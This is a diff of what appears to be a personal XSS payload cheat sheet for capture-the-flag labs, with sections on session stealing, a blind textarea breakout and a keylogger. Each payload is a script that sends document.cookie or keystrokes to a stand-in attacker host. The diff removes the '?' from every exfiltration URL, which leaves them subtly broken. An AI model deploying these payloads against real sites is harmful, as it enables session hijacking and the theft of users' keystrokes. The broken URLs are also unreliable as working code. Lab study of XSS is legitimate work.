@@ -6,19 +6,19 @@
 ___
 
 ## Session Stealing
-<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+<script>fetch('https://hacker.thm/stealcookie=' + btoa(document.cookie));</script>
 
 <script>
-new Image().src='http://TU_IP:8080/steal?c='+document.cookie;
+new Image().src='http://TU_IP:8080/stealc='+document.cookie;
 </script>
 
 ### Blind TextArea cokie steal
-</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script> 
+</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBERcookie=' + btoa(document.cookie) );</script> 
 ___
 
 ## Key Logger
 
-<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/logkey=' + btoa(e.key) );}</script>
 ___
 
 ## Business Logic
